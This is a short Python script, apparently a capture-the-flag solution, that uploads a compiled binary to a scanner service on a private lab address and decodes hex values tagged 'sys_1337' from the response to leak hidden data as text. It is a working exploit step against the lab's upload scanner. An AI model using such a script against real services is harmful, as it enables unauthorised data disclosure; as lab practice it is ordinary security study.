import requests
import re
import struct

files = {'file' : open('a.out', 'rb')}
r = requests.post('http://10.129.212.51/scanner/upload/', files = files)
p = re.compile('sys_1337.* = 0x([0-9a-f]*)')
matches = re.findall(p, r.text)

for data in matches:
    out = struct.pack("Q", int(data, 16))
    print(out.decode(), end = '')
